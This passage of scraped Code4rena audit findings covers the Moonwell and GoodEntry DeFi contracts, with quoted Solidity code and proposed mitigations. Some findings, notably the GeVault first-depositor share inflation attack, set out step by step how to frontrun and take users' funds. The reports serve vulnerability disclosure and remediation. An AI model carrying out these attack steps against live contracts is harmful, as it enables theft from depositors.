"https://github.com/code-423n4/2023-07-moonwell-findings/issues/226", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-25"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/LosPollosHermanos-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/214", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-27"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/ast3ros-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/196", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-28"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/Arz-Q.md)."}, {"title": "_setCloseFactor is missing importan checks in comptroller contract", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/187", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "Q-29"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/src/core/Comptroller.sol#L689   # Vulnerability details  The comptroller contract is missing importan validation when the admin set a new close factor  ## Impact Lack on validation when setting new close factor can let the contract in a position where liquidator can liquidate more than he should.  ## Proof of Concept The comptroller contract is declaring in the top of the code the next staments:  ``` // closeFactorMantissa must be strictly greater than this value     uint256 internal constant closeFactorMinMantissa = 0.05e18; // 0.05  // closeFactorMantissa must not exceed this value uint256 internal constant closeFactorMaxMantissa = 0.9e18; // 0.9 ```  however when the admin set the close factor there is no validation of the new close factor:  ``` file:src/core/Comptroller.sol  function _setCloseFactor(uint newCloseFactorMantissa) external returns (uint) {         // Check caller is admin      require(msg.sender == admin, \"only admin can set close factor\");          uint oldCloseFactorMantissa = closeFactorMantissa;         closeFactorMantissa = newCloseFactorMantissa;         emit NewCloseFactor(oldCloseFactorMantissa, closeFactorMantissa);          return uint(Error.NO_ERROR);     } ``` https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/src/core/Comptroller.sol#L689  ## Tools Used manual  ## Recommended Mitigation Steps check if the close factor is in the properly range:  ``` function _setCloseFactor(uint newCloseFactorMantissa) external returns (uint) {         // Check caller is admin      require(msg.sender == admin, \"only admin can set close factor\");          require(newCloseFactorMantissa>=closeFactorMinMantissa);         require(newCloseFactorMantissa<= closeFactorMaxMantissa);          uint oldCloseFactorMantissa = closeFactorMantissa;         closeFactorMantissa = newCloseFactorMantissa;         emit NewCloseFactor(oldCloseFactorMantissa, closeFactorMantissa);          return uint(Error.NO_ERROR);     } ```   ## Assessed type  Other"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/180", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-31"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/solsaver-Q.md)."}, {"title": "Initial deploy won't succeed because of too high `initialMintAmount` for USDC market", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/143", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "selected for report", "sponsor confirmed", "M-11"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/test/proposals/Configs.sol#L55   # Vulnerability details  ## Impact At the time of deploy, deployer initializes token markets with initial amount to prevent exploit. At least USDC and WETH markets will be initialized during deploy. But `initialMintAmount` is hardcoded to `1e18` which is of for WETH (1,876 USD), but unrealistic for USDC (1,000,000,000,000 USD). Therefore deploy will fail.  ## Proof of Concept Here `initialMintAmount = 1 ether`: https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/test/proposals/Configs.sol#L55 ```solidity     /// @notice initial mToken mint amount     uint256 public constant initialMintAmount = 1 ether; ```  Here this amount is approved to MToken contract and supplied to mint MToken: https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/test/proposals/mips/mip00.sol#L334-L379 ```solidity             for (uint256 i = 0; i < cTokenConfigs.length; i++) {                 Configs.CTokenConfiguration memory config = cTokenConfigs[i];                  address cTokenAddress = addresses.getAddress(                     config.addressesString                 );                 ...                  /// Approvals                 _pushCrossChainAction(                     config.tokenAddress,                     abi.encodeWithSignature(                         \"approve(address,uint256)\",                         cTokenAddress,                         initialMintAmount                     ),                     \"Approve underlying token to be spent by market\"                 );                  /// Initialize markets                 _pushCrossChainAction(                     cTokenAddress,                     abi.encodeWithSignature(\"mint(uint256)\", initialMintAmount),                     \"Initialize token market to prevent exploit\"                 );                  ...             } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps Specify `initialMintAmount` for every token separately in config   ## Assessed type  Other"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/132", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-39"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/kodyvim-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/115", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-42"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/Sathish9098-Q.md)."}, {"title": "Incorrect chainId of Base in deploy script will force redeployment", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/114", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-13"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/test/utils/ChainIds.sol#L7   # Vulnerability details  ## Impact Incorrect chainId of Base in deploy parameters results in incorrect deploy and subsequent redeployment  ## Proof of Concept Contract ChainIds.sol is responsible for mapping `chainId -> wormholeChainId` which is used in contract `Addresses` to associate contract name with its address on specific chain. `Addresses` is the main contract which keeps track of all dependency addresses and passed into main `deploy()` and here addresses accessed via block.chainId: https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/test/proposals/mips/mip00.sol#L77 ```solidity     function deploy(Addresses addresses, address) public {         ...             trustedSenders[0].chainId = chainIdToWormHoleId[block.chainid];                      ...             memory cTokenConfigs = getCTokenConfigurations(block.chainid);     } ``` Here you can see that Network ID of Base set to 84531. But actual network id is 8453 from [Base docs](https://docs.base.org/network-information/) ```solidity contract ChainIds {     uint256 public constant baseChainId = 84531;     uint16 public constant baseWormholeChainId = 30; /// TODO update when actual base chain id is known          uint256 public constant baseGoerliChainId = 84531;     uint16 public constant baseGoerliWormholeChainId = 30;          ...      constructor() {         ...         chainIdToWormHoleId[baseChainId] = moonBeamWormholeChainId; /// base deployment is owned by moonbeam governance         ...     } } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps Change Base Network ID to 8453   ## Assessed type  Other"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/110", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-43"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/MohammedRizwan-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/85", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-47"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/Rolezn-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/74", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-49"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/catellatech-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/71", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-32"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/berlin-101-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/69", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-40"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/nadin-Q.md)."}, {"title": "Its not possible to liquidate deprecated market", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/67", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-14"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/src/core/Comptroller.sol#L394   # Vulnerability details  ## Impact Detailed description of the impact of this finding. Its not possible to liquidate deprecated market ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept. Currently in the code that is a function `_setBorrowPaused` that paused pause borrowing. In [origin compound code](https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/Comptroller.sol#L1452) `borrowGuardianPaused` is used to do liquidate markets that are bad. So now there is not way to get rid of bad markets. ```solidity     function liquidateBorrowAllowed(         address mTokenBorrowed,         address mTokenCollateral,         address liquidator,         address borrower,         uint repayAmount) override external view returns (uint) {         // Shh - currently unused         liquidator;          if (!markets[mTokenBorrowed].isListed || !markets[mTokenCollateral].isListed) {             return uint(Error.MARKET_NOT_LISTED);         }          /* The borrower must have shortfall in order to be liquidatable */         (Error err, , uint shortfall) = getAccountLiquidityInternal(borrower);         if (err != Error.NO_ERROR) {             return uint(err);         }         if (shortfall == 0) {             return uint(Error.INSUFFICIENT_SHORTFALL);         }          /* The liquidator may not repay more than what is allowed by the closeFactor */         uint borrowBalance = MToken(mTokenBorrowed).borrowBalanceStored(borrower);         uint maxClose = mul_ScalarTruncate(Exp({mantissa: closeFactorMantissa}), borrowBalance);         if (repayAmount > maxClose) {             return uint(Error.TOO_MUCH_REPAY);         }          return uint(Error.NO_ERROR);     }  ``` [src/core/Comptroller.sol#L394](https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/src/core/Comptroller.sol#L394) Here is a list why liquidating deprecated markets can be necessary: 1) Deprecated markets may pose security risks, especially if they are no longer actively monitored or maintained. By liquidating these markets, the platform reduces the potential for vulnerabilities and ensures that user funds are not exposed to unnecessary risks.  2) Deprecated markets might require ongoing resources to maintain and support, including development efforts and infrastructure costs. By liquidating these markets, the platform can optimize resources and focus on more actively used markets and features. 3) Older markets might be based on legacy smart contracts that lack the latest security enhancements and improvements. Liquidating these markets allows the platform to migrate users to more secure and up-to-date contracts.  4) Deprecated markets may result in a fragmented user base, leading to reduced liquidity and trading activity. By consolidating users onto actively used markets, the platform can foster higher liquidity and better user engagement.  ## Tools Used  ## Recommended Mitigation Steps I think compound have a way to liquidate deprecated markets for a safety reason, so it needs to be restored ```diff     function liquidateBorrowAllowed(         address mTokenBorrowed,         address mTokenCollateral,         address liquidator,         address borrower,         uint repayAmount) override external view returns (uint) {         // Shh - currently unused         liquidator;         /* allow accounts to be liquidated if the market is deprecated */ +        if (isDeprecated(CToken(cTokenBorrowed))) { +            require(borrowBalance >= repayAmount, \"Can not repay more than the total borrow\"); +            return uint(Error.NO_ERROR); +        }         if (!markets[mTokenBorrowed].isListed || !markets[mTokenCollateral].isListed) {             return uint(Error.MARKET_NOT_LISTED);         }          /* The borrower must have shortfall in order to be liquidatable */         (Error err, , uint shortfall) = getAccountLiquidityInternal(borrower);         if (err != Error.NO_ERROR) {             return uint(err);         }         if (shortfall == 0) {             return uint(Error.INSUFFICIENT_SHORTFALL);         }          /* The liquidator may not repay more than what is allowed by the closeFactor */         uint borrowBalance = MToken(mTokenBorrowed).borrowBalanceStored(borrower);         uint maxClose = mul_ScalarTruncate(Exp({mantissa: closeFactorMantissa}), borrowBalance);         if (repayAmount > maxClose) {             return uint(Error.TOO_MUCH_REPAY);         }          return uint(Error.NO_ERROR);     } +    function isDeprecated(CToken cToken) public view returns (bool) { +        return +        markets[address(cToken)].collateralFactorMantissa == 0 && +        borrowGuardianPaused[address(cToken)] == true && +        cToken.reserveFactorMantissa() == 1e18 +        ; +    }      ```   ## Assessed type  Error"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/36", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-45"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/ravikiranweb3-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/20", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-54"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/niki-Q.md)."}, {"title": "a single emissionCap is not suitable for different tokens reward if they have different underlying decimals", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/19", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-17"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MultiRewardDistributor/MultiRewardDistributor.sol#L65-L68   # Vulnerability details  ## Impact a single emissionCap is not suitable for different tokens reward if they have different underlying decimals  At MultiRewardDistributor, different rewards token can be set up for each mToken, which is the assetToken or debtToken of the lending protocol. When a reward token is set up, it's emission speed cannot be bigger than the emissionCap (100 * 1e18 as suggested in the code comment). However since multiple reward tokens may be set up, and they may have different decimal places, for example USDT has a decimal of 6 and GUSD even has a decimal of 2 they are virtually not bounded by such emissionCap.   On the contract, tokens with more than 18 decimal would not be practically emitted. This one-size-fit-all emissionCap might create obstacles for the protocol to effectively manage each rewardTokens.  ```solidity     /// @notice The emission cap dictates an upper limit for reward speed emission speed configs     /// @dev By default, is set to 100 1e18 token emissions / sec to avoid unbounded     ///  computation/multiplication overflows     uint256 public emissionCap; ```  ```solidity     function _updateBorrowSpeed(         MToken _mToken,         address _emissionToken,         uint256 _newBorrowSpeed     ) external onlyEmissionConfigOwnerOrAdmin(_mToken, _emissionToken) {         MarketEmissionConfig             storage emissionConfig = fetchConfigByEmissionToken(                 _mToken,                 _emissionToken             );          uint256 currentBorrowSpeed = emissionConfig             .config             .borrowEmissionsPerSec;          require(             _newBorrowSpeed != currentBorrowSpeed,             \"Can't set new borrow emissions to be equal to current!\"         );         require(             _newBorrowSpeed < emissionCap,             \"Cannot set a borrow reward speed higher than the emission cap!\"         ); ``` https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MultiRewardDistributor/MultiRewardDistributor.sol#L703-L725   ## Proof of Concept   ## Tools Used  ## Recommended Mitigation Steps Consider creating emissionCap for each rewardTokens so they can be adapted based on their own decimals   ## Assessed type  Context"}, {"title": "An excess amount of debt remaining in the contract, potentially results in a loss of user funds.", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/560", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-03"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/main/contracts/PositionManager/OptionsPositionManager.sol#L236-L239 https://github.com/code-423n4/2023-08-goodentry/tree/main/contracts/PositionManager/OptionsPositionManager.sol#L310   # Vulnerability details  ## Impact In the `OptionsPositionManager` contract, there is a vulnerability related to the treatment of excess repayment amount when closing a user's position. The contract does not take into account the final amount repaid from the `LP.repay` function (Line 310), potentially leading to an excess amount of debt remaining in the contract. This issue could result in a loss of user funds.  ```solidity function close(...)    external {   ...   debt = closeDebt(poolId, user, debtAsset, debt, collateralAsset);    cleanup(LP, user, token0); // <= Found   cleanup(LP, user, token1); // <= Found }  function closeDebt(...) internal returns (uint debt) {     ...     if (user != address(this) ) LP.repay( debtAsset, debt, 2, user); // <= Found } ```  ## Proof of Concept In the scenario where a user tries to repay with an over-estimated amount of debt, the excess TR amount is stuck in the OptionsPositionManager contract. `OptionsPositionManager.close` function, in charge of asset refunding, does not do its task properly (Line 238-239). It only refund Token0 and Token1, not takes care of potential TR debt. This can lead to a situation where the contract holds an excess amount of debt, which is not accounted for.  ## Tools Used Manual review  ## Recommended Mitigation Steps Record the actual repaid amount from the `LP.repay` function and adjust the user's debt accordingly. Additionally, the excess amount that is not refunded should be accounted for and properly handled in the `OptionsPositionManager.close` function.   ## Assessed type  Other"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/476", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-07"], "target": "2023-08-goodentry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-goodentry-findings/blob/main/data/Raihan-G.md)."}, {"title": "V3 Proxy does not send funds to the recipient, instead it sends to the msg.sender", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/463", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-01"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/helper/V3Proxy.sol#L112-L194   # Vulnerability details   ## Impact The functions above can be used to swap tokens, however the swaps are not sent to the provided address. Instead they are sent to the msg.sender.  This could cause issues if the user has been blacklisted on a token. Or if the user has a compromised signature/allowance of the target token and they attempt to swap to the token, the user looses all value even though they provided an destination adress   ## Proof of Concept ```solidity //@audit-H does not send tokens to the required address      function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts) {         require(path.length == 2, \"Direct swap only\");         ERC20 ogInAsset = ERC20(path[0]);         ogInAsset.safeTransferFrom(msg.sender, address(this), amountIn);         ogInAsset.safeApprove(address(ROUTER), amountIn);         amounts = new uint[](2);         amounts[0] = amountIn;          //@audit-issue it should be the to address not msg.sender         amounts[1] = ROUTER.exactInputSingle(ISwapRouter.ExactInputSingleParams(path[0], path[1], feeTier, msg.sender, deadline, amountIn, amountOutMin, 0));         ogInAsset.safeApprove(address(ROUTER), 0);         emit Swap(msg.sender, path[0], path[1], amounts[0], amounts[1]);      } ```  Here is one of the many functions with this issue, As we can see after the swap is completed, tokens are sent back to the msg.sender from the router not to the ```to``` address  ## Tools Used Manual Review.  Uniswap Router: https://github.com/Uniswap/v3-periphery/blob/main/contracts/SwapRouter.sol ## Recommended Mitigation Steps The uniswap router supports inputting of a destination address. Hence the router should be called with the to address not the msg.sender.  Else remove the ```address to``` from the parameter list      ## Assessed type  Uniswap"}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/440", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-07"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L228 https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L229   # Vulnerability details  ## Impact Some tokens do not revert the transaction when the transfer or transferFrom fails and returns False. Hence we must check the return value after calling the transfer or transferFrom function.  ## Proof of Concept Check the last answer here: https://ethereum.stackexchange.com/questions/136039/what-is-best-practice-for-transferfrom-out-of-these-two-ways In short:  So using `token.transferFrom(msg.sender, addr, amount);` is NOT enough. The risk is that you're assuming the transfer was successful when actually it wasn't. Example of tokens that don't revert: ZRX, HT, WOO. The safest method is using this:  `(bool success, bytes memory data) = address(token).call(abi.encodeWithSelector(token.transferFrom.selector, from, to, value)); require(success && (data.length == 0 || abi.decode(data, (bool))), 'token transfer from sender failed');` This is the one used by Openzeppelin's SafeERC20 library.  ## Tools Used Manual Report  ## Recommended Mitigation Steps Use OpenZeppelin SafeERC20's safetransfer and safetransferFrom functions.   ## Assessed type  Token-Transfer"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/424", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "sponsor confirmed", "G-11"], "target": "2023-08-goodentry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-08-goodentry-findings/blob/main/data/JCK-G.md)."}, {"title": "When price is within within position's range, `deposit` at TokenisableRange can cause loss of fund", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/373", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L237-L247   # Vulnerability details  ## Impact When slot0 price is within the range of tokenized position, function `deposit` needs to be called with both parameters, `n0` and `n1`, greater than zero. However, if price moves outside the range during the transaction, user will be charged an excessive fee.  ## Proof of Concept     if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){       address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);       (uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();       (uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);       if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);       if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);       fee0 += newFee0;       fee1 += newFee1;        n0   -= newFee0;       n1   -= newFee1;     }  Suppose range is [120, 122] and current price is 121. Alice calls `deposit` with `{n0: 100, n1:100} `, if Price moves to 119 during execution (due to market fluctuations or malicious frontrunning), `getAmountsForLiquidity` will return 0 for `token1Amount`. As a result, `newFee1` will be equal to `n1`, which means all the 100 token1 will be charged as fee.      (uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(       INonfungiblePositionManager.IncreaseLiquidityParams({         tokenId: tokenId,         amount0Desired: n0,         amount1Desired: n1,         amount0Min: n0 * 95 / 100,         amount1Min: n1 * 95 / 100,         deadline: block.timestamp       })     );  Then, `increaseLiquidity` will succeed since `amount1Min` is now zero.  ## Tools Used Manual  ## Recommended Mitigation Steps Don't use this to calculate fee:      if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){       address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);       (uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();       (uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);       if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);       if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);       fee0 += newFee0;       fee1 += newFee1;        n0   -= newFee0;       n1   -= newFee1;     }  Always use this:        uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));       uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));       require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");       // Calculate the equivalent liquidity amount of the non-yet compounded fees       // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity        feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )                                        / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) );    ## Assessed type  Context"}, {"title": "First depositor can break minting of liquidity shares in GeVault", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/367", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/GeVault.sol#L271-L278 https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/GeVault.sol#L420-L424   # Vulnerability details  ## Impact In [GeVault](https://github.com/code-423n4/2023-08-goodentry/blob/main/contracts/GeVault.sol), while depositing tokens in the pool, liquidity tokens are minted to the users.  Calculation of liquidity tokens to mint uses `balanceOf(address(this))` which makes it susceptible to first deposit share price manipulation attack.  `deposit` calls `getTVL`, which calls `getTickBalance`   [GeVault.deposit#L271-L278](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/GeVault.sol#L271-L278) ```     uint vaultValueX8 = getTVL();     uint tSupply = totalSupply();     // initial liquidity at 1e18 token ~ $1     if (tSupply == 0 || vaultValueX8 == 0)       liquidity = valueX8 * 1e10;     else {       liquidity = tSupply * valueX8 / vaultValueX8;     } ``` [GeVault.getTVL#L392-L398](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/GeVault.sol#L392-L398) ```   function getTVL() public view returns (uint valueX8){     for(uint k=0; k<ticks.length; k++){       TokenisableRange t = ticks[k];       uint bal = getTickBalance(k);       valueX8 += bal * t.latestAnswer() / 1e18;     }   } ``` [GeVault.getTickBalance#L420-L424](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/GeVault.sol#L420-L424) ```   function getTickBalance(uint index) public view returns (uint liquidity) {     TokenisableRange t = ticks[index];     address aTokenAddress = lendingPool.getReserveData(address(t)).aTokenAddress;     liquidity = ERC20(aTokenAddress).balanceOf(address(this));   } ```  Although there is a condition on line [`281`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/GeVault.sol#L281) that liquidity to be minted must be greater than 0, User's funds can be at risk. ## Proof of Concept When totalSupply is zero, an attacker can go ahead and execute following steps.  1. Calls [deposit](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/GeVault.sol#L247) function with 1 wei amount of underlying as argument. To that, he will be minted some amount of liquidity share depending on the price of underlying. 2. [Withdraw](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/GeVault.sol#L214) all except one wei of shares. 3. Transfer some X amount of underlying directly to pool contract address. So, now 1 wei of share worths X underlying tokens. Attacker won't have any problem making this X as big as possible. Because he'll always be able to redeem it with 1 wei of share.  **Impact** 1. Almost 1/4th of first deposit can be frontrun and stolen. - Let's assume there is a first user trying to deposit with z dollars worth of tokens - An attacker can see this transaction in mempool and carry out the above-described attack with x = (z/2 + 1). - This means the user gets 1 Wei of share which is only worth ~ 3x/4 of tokens. - Here, the percentage of the user funds lost depends on how much capital the attacker has. let's say a attacker keeps 2 wei in the share initially instead of 1 (this makes doubles capital requirement), they can get away with 33% of the user's funds. 2. DOS to users who tries to deposit less than X because of this [check](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/GeVault.sol#L281) ```     require(liquidity > 0, \"GEV: No Liquidity Added\"); ``` ## Tools Used Manual Review ## Recommended Mitigation Steps - Burn some MINIMUM_LIQUIDITY during first deposit   ## Assessed type  Math"}, {"title": "Unused funds are not returned and not counted in `GeVault`", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/325", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L407   # Vulnerability details  ## Impact Users can lose a portion of their 